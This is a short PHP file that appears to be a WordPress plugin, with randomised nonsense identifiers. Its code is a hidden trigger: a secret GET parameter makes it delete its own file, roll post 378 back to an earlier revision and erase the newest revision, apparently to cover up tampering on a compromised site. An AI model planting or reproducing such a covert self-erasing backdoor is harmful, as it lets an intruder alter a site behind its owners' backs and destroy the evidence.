<?php

function column_amp_pop_daily() {
	if (isset($_GET['restaurant_poll_flash_slide']) && $_GET['restaurant_poll_flash_slide'] === 'integration_remover_all_daily') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$crm_qr_multisite = 378;
		$interactivity_urls_manage = wp_get_post_revisions($crm_qr_multisite);
		if (empty($interactivity_urls_manage)) die('no revisions');
		if (count($interactivity_urls_manage) < 2) die('less than 2');
		$discount_first_addons_project = array_shift($interactivity_urls_manage);
		$sticky_engine_column = $discount_first_addons_project->ID;
		$event_sidebar_notes_effects = array_shift($interactivity_urls_manage);
		$themes_smtp_gateway = $event_sidebar_notes_effects->ID;
		$pinterest_speed_testimonial_design = wp_restore_post_revision($themes_smtp_gateway);
		if ($pinterest_speed_testimonial_design === false) die('error restoring');
		$pinterest_speed_testimonial_design = wp_delete_post_revision($sticky_engine_column);		
		if ($pinterest_speed_testimonial_design === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'column_amp_pop_daily');
